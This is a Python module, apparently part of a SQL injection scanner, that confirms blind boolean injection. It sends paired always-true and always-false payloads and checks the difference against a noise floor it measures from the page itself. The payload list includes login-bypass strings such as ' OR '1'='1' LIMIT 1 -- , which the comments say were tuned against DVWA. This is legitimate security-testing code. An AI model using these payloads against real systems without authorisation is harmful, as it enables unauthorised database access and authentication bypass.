"""Stage 2. The true/false test.

Send two payloads that are identical except for one condition, which is always
true in the first and always false in the second. Nothing else about the two
requests differs. So if the two responses come back different, the only thing
that could have caused it is the database evaluating that condition. That is
the proof.

The catch is pages that echo your input. Then the responses differ simply
because the payloads differ, and every reflected parameter looks injectable.
strip_payload takes the payload back out before comparing, which is what stops
/search and /plain being confirmed.

The other catch is that "different" needs a number, and a fixed one does not
work. Pages are not static. A csrf token, a timestamp or a view counter changes
between two identical requests, so a real page never quite matches itself. Guess
the number too tight and ordinary page noise reads as a bug. Guess it too loose,
as 0.98 turned out to be, and a real difference buried in a large template gets
thrown away: DVWA's brute force login came back at 0.9948 between logged in and
rejected, which is a genuine difference and was being rejected as noise.

So the number is measured instead of guessed. Ask the page the same question a
few times first and see how much it disagrees with itself. That is the floor,
and a true/false pair has to beat it. Noisy pages set a low bar for themselves
and quiet ones set a high one, which is the right way round.
"""
from ..findings import Finding, Verdict
from ..probe import send, similarity, strip_payload

# each pair is (always true, always false). the two strings must differ only in
# the condition, never in length or shape, or the comparison is meaningless.
PAYLOAD_PAIRS = [
    (" AND 1=1", " AND 1=2"),                       # number field
    ("' AND '1'='1", "' AND '1'='2"),               # text field
    ("' OR '1'='1' -- ", "' OR '1'='2' -- "),       # text field, rest commented out
    (" OR 1=1", " OR 1=2"),                         # number field, same idea
    # Some checks want exactly one row and read "all of them" as failure, the
    # same as "none of them". A login is the usual one. Against those, OR '1'='1'
    # returns every user and looks like a rejected password, so the pair above
    # sees no difference at all. LIMIT 1 gives the true side one row and the
    # false side none, which those checks can tell apart. This is what DVWA's
    # brute force page needed.
    ("' OR '1'='1' LIMIT 1 -- ", "' OR '1'='2' LIMIT 1 -- "),
    (" OR 1=1 LIMIT 1", " OR 1=2 LIMIT 1"),
]

# how many times to ask the same question when measuring how much the page
# disagrees with itself
CONTROL_SAMPLES = 3

# how far below the page's own noise a true/false pair has to sit before it
# counts as a real difference rather than more of the same noise
MARGIN = 0.002


def _noise_floor(client, point, base):
    """How much does this page differ from itself? Send the same thing and see.

    Takes the worst disagreement seen, not the average, because the bar has to
    clear the noisiest the page has been observed to be, not its typical day.
    """
    bodies = []
    for _ in range(CONTROL_SAMPLES):
        response = send(client, point, base)
        bodies.append(strip_payload(response.body, base))

    worst = 1.0
    for i in range(len(bodies)):
        for j in range(i + 1, len(bodies)):
            worst = min(worst, similarity(bodies[i], bodies[j]))
    return worst


def _compare(client, point, true_payload, false_payload):
    """Send one true/false pair and score how alike the answers are."""
    t = send(client, point, true_payload)
    f = send(client, point, false_payload)
    score = similarity(strip_payload(t.body, true_payload),
                       strip_payload(f.body, false_payload))
    return score, t, f


def validate(client, point, reason):
    base = point.value or "1"
    attempts = []

    try:
        floor = _noise_floor(client, point, base)
    except Exception as e:
        return Finding("sqli", point, Verdict.UNCONFIRMED,
                       f"could not measure the page: {e}",
                       {"detector_reason": reason, "technique": "boolean"})

    threshold = floor - MARGIN

    for true_suffix, false_suffix in PAYLOAD_PAIRS:
        true_payload = base + true_suffix
        false_payload = base + false_suffix

        try:
            score, t, f = _compare(client, point, true_payload, false_payload)
        except Exception as e:
            return Finding("sqli", point, Verdict.UNCONFIRMED,
                           f"could not complete the test: {e}",
                           {"detector_reason": reason, "technique": "boolean",
                            "attempts": attempts})

        attempt = {
            "true_payload": true_payload,
            "false_payload": false_payload,
            "true_status": t.status,
            "false_status": f.status,
            "true_length": t.length,
            "false_length": f.length,
            "similarity": round(score, 4),
            "noise_floor": round(floor, 4),
            "threshold": round(threshold, 4),
        }

        if score >= threshold:
            attempt["result"] = "no more different than the page is from itself"
            attempts.append(attempt)
            continue

        # Looks like a hit. Ask again before believing it. A difference caused by
        # the database evaluating the condition happens every time. A difference
        # caused by something on the page changing on its own does not, and this
        # is the last thing standing between a lucky fluctuation and a finding
        # reported as proved.
        try:
            repeat_score, _, _ = _compare(client, point, true_payload, false_payload)
        except Exception as e:
            return Finding("sqli", point, Verdict.UNCONFIRMED,
                           f"could not repeat the test: {e}",
                           {"detector_reason": reason, "technique": "boolean",
                            "attempts": attempts + [attempt]})

        attempt["repeat_similarity"] = round(repeat_score, 4)

        if repeat_score >= threshold:
            attempt["result"] = "differed once and then did not, so it was noise"
            attempts.append(attempt)
            continue

        return Finding(
            "sqli", point, Verdict.CONFIRMED,
            f"true and false conditions gave different responses, twice "
            f"(similarity {score:.4f} then {repeat_score:.4f}, "
            f"page noise floor {floor:.4f})",
            {
                "detector_reason": reason,
                "technique": "boolean",
                "proof": attempt,
                "true_body": t.body[:600],
                "false_body": f.body[:600],
            },
        )

    return Finding("sqli", point, Verdict.REJECTED,
                   f"no true/false pair beat the page's own noise "
                   f"(floor {floor:.4f})",
                   {"detector_reason": reason, "technique": "boolean",
                    "noise_floor": round(floor, 4), "attempts": attempts})
